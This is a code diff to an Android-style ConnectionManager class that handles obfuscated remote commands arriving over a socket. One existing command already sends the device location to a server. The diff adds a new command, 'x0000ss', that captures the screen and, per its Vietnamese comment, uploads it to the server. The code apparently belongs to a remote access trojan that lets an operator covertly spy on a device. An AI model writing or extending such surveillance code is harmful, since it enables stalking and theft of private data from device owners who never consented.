@@ -150,6 +150,10 @@ public class ConnectionManager {
                             case "x0000lm":
                                 x0000lm();
                                 break;
+                            case "x0000ss":
+                                // Screenshot command
+                                x0000ss();
+                                break;
                         }
                     } catch (Exception e) {
                         Log.e("ConnectionManager", "Error processing order", e);
@@ -470,6 +474,20 @@ public class ConnectionManager {
         ioSocket.emit("x0000lm", location);
     }
 
+    /**
+     * Screenshot command handler
+     * Chụp màn hình và gửi lên server
+     */
+    public static void x0000ss() {
+        try {
+            Log.d("ConnectionManager", "Screenshot command received");
+            if (context != null) {
+                ScreenshotManager.getInstance(context).takeScreenshot();
+            }
+        } catch (Exception e) {
+            Log.e("ConnectionManager", "Error taking screenshot", e);
+        }
+    }
 
 
 
